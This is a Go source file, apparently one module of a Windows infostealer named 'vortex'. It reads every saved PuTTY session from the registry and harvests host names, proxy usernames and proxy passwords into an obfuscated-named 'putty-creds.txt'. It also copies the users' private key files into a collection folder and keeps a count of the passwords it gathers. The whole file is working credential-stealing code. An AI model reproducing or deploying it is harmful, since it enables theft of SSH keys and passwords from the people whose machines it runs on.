//go:build windows

package softwares

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"vortex/encrypt"
	"vortex/hutil"

	"github.com/olekukonko/tablewriter"
	"golang.org/x/sys/windows/registry"
)

func puttySubkeyList() ([]string, error) {
	var puttyRegPath = "Software\\SimonTatham\\PuTTY\\Sessions"

	k, err := registry.OpenKey(registry.CURRENT_USER, puttyRegPath, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		if errors.Is(err, registry.ErrNotExist) {
			return nil, nil
		}
		return nil, err
	}
	defer k.Close()

	puttySessions, err := k.ReadSubKeyNames(0)
	if err != nil {
		return nil, err
	}

	return puttySessions, nil

}

func PuttyDataQuery(mainFolder string) error {
	var out []string

	subKeys, err := puttySubkeyList()
	if err != nil {
		return err
	}

	if subKeys == nil {
		return nil
	}

	puttyFile := filepath.Join(mainFolder, encrypt.B64Util("putty-creds.txt", 0))
	file, err := os.Create(puttyFile)
	if err != nil {
		return err
	}
	defer file.Close()

	regKeys := []string{
		"HostName",
		"PublicKeyFile",
		"ProxyHost",
		"ProxyUsername",
		"ProxyPassword",
	}

	creds := tablewriter.NewWriter(file)
	creds.SetHeader(regKeys)

	for i := range subKeys {
		k, err := registry.OpenKey(registry.CURRENT_USER, "Software\\SimonTatham\\PuTTY\\Sessions\\"+subKeys[i], registry.QUERY_VALUE)
		if err != nil {
			return err
		}
		defer k.Close()
		for j := range regKeys {
			v, _, err := k.GetStringValue(regKeys[j])
			if err != nil {
				return err
			}
			out = append(out, v)
			if regKeys[j] == "PublicKeyFile" && strings.Contains(v, "\\") {
				if err = hutil.CopyFile(v, filepath.Join(mainFolder, encrypt.B64Util("putty-"+filepath.Base(v), 0))); err != nil {
					continue
				}
			}
			if regKeys[j] == "ProxyPassword" {
				hutil.PasswordCounter++
			}
		}
		creds.Append(out)
		out = nil
	}
	creds.Render()

	return nil
}
